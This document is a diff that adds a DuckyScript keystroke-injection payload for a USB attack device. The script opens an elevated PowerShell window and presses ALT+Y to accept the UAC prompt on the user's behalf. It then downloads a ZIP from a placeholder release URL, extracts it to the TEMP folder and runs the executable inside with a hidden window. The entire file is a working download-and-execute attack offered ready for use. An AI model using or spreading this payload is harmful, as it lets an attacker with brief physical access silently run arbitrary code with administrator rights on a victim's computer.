@@ -1,0 +1,32 @@
+REM Open the Run dialog
+GUI r
+DELAY 500
+
+REM Type "powershell" and run as administrator
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 500
+
+REM Wait for the UAC prompt and automatically press ALT + Y
+DELAY 1000
+ALT y
+DELAY 500
+
+REM Download the ZIP file
+STRING Invoke-WebRequest -Uri 'YOUR_GITHUB_RELEASES_PAGE' -OutFile "$env:TEMP\testExec.zip"
+ENTER
+DELAY 500
+
+REM Extract the ZIP file
+STRING Expand-Archive -Path "$env:TEMP\testExec.zip" -DestinationPath "$env:TEMP\zipfile"
+ENTER
+DELAY 800
+
+REM Run the executable
+STRING Start-Process -FilePath "$env:TEMP\zipfile\testExec.exe" -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM Exit PowerShell
+STRING exit
+ENTER
